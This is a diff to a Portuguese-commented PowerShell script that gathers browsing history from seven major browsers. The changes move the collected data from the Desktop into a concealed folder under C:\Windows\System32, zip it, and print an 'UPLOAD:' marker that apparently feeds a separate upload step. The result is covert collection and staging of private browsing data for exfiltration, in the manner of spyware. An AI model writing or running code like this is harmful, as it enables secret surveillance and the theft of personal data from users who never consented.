@@ -1,10 +1,8 @@
-# ============================================================
-# Copiar histórico dos principais browsers - Windows
-# Chrome, Edge, Brave, Vivaldi, Opera, Opera GX e Firefox
-# ============================================================
+# Copiar histórico dos principais browsers -  Chrome, Edge, Brave, Vivaldi, Opera, Opera GX e Firefox
 
 $Timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
-$Destino = Join-Path $env:USERPROFILE "Desktop\Browser_History_$Timestamp"
+$Destino = "C:\Windows\System32\ap32\Browser_History_$Timestamp"
+$DestinoZip = "C:\Windows\System32\ap32\Browser_History_$Timestamp.zip"
 
 New-Item -ItemType Directory -Path $Destino -Force | Out-Null
 
@@ -142,5 +140,6 @@ if (Test-Path $FirefoxProfiles) {
         }
 }
 
+Compress-Archive -Path $Destino -DestinationPath $DestinoZip
 
-Write-Output "UPLOAD:$Destino"
+Write-Output "UPLOAD:$DestinoZip"
